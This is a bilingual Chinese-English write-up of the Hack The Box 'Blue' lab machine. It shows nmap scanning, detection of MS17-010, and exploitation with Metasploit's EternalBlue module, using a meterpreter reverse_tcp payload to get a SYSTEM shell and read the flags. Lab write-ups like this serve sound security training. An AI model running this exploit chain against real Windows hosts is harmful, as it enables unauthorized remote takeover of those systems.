# HTB - Blue 靶场渗透分析报告 | Blue Walkthrough 

> 🎯 难度 / Difficulty: Easy  
> 💡 类型 / Category: Windows / SMB / MS17-010  
> 🧠 技术点 / Key Techniques: EternalBlue, Metasploit, Privilege Check  
> 🌐 靶机地址 / Target IP: 10.10.10.40

---

## 1. 信息收集阶段 | Information Gathering

### 1.1 全端口扫描 | Full TCP Port Scan

```apl
nmap --min-rate=1000 -n -p- --open -Pn 10.10.10.40 -oN all_port_scan
```

🔍 中文说明：对目标进行高速度、无DNS解析的全端口扫描。
 🔍 EN: Conducting a high-speed, no-DNS full TCP port scan on the target.

------

### 1.2 端口服务识别 | Service and Version Detection

```apl
nmap -sC -sV -p135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 -oN nmap_blue
```

🔍 中文说明：对已知端口进行脚本和版本识别，发现为 Windows 7 系统，SMB 开放。
 🔍 EN: Use default scripts and version detection on key ports. Found Windows 7 and open SMB.

------

### 1.3 漏洞扫描 | Vulnerability Check

```apl
nmap --script vuln 10.10.10.40 -p 139,445 -oN script_scan
```

🔍 中文说明：利用 Nmap 的漏洞脚本扫描 SMB 服务，发现目标存在 MS17-010 漏洞。
 🔍 EN: Scan SMB ports with Nmap vulnerability scripts. MS17-010 confirmed on the target.

------

## 2. 漏洞利用阶段 | Exploitation Phase

### 2.1 启动 Metasploit | Launch Metasploit

```apl
msfconsole
```

🛠️ 中文说明：进入渗透测试框架 Metasploit，准备配置漏洞利用模块。
 🛠️ EN: Launch Metasploit Framework to prepare for module configuration.

------

### 2.2 EternalBlue 模块配置 | EternalBlue Module Setup

```apl
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST <你的 VPN IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

💥 中文说明：加载永恒之蓝漏洞模块，配置远程目标与监听地址，执行攻击。
 💥 EN: Load EternalBlue exploit, set target IP and local listener, then run the exploit.

------

## 3. 获取权限与提权 | Gaining Access & Privileges

### 3.1 进入 shell 并验证权限 | Open Shell & Check Privileges

```apl
shell
whoami
```

🔑 中文说明：获取系统 shell 后执行 `whoami`，发现权限为 NT AUTHORITY\SYSTEM。
 🔑 EN: Get a system shell and run `whoami`, confirming SYSTEM-level privileges.

------

## 4. 查找并获取 Flags | Capture the Flags

```apl
type C:\Users\haris\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

🚩 中文说明：通过 meterpreter 或 shell 获取 user 和 root 的 flag。
 🚩 EN: Retrieve user and root flags from the respective user Desktop folders.

------

## 5. 总结与复盘 | Summary & Review

| 模块     | 内容                                           |
| -------- | ---------------------------------------------- |
| 🎯 漏洞   | MS17-010（永恒之蓝）                           |
| 🔌 服务   | SMB 端口（445）开放                            |
| 🧰 工具   | Nmap + Metasploit Framework                    |
| 🚀 成果   | 成功获取最高权限，读取两枚 flag                |
| 📚 学习点 | Windows 漏洞识别、MSF模块使用、SMB服务利用流程 |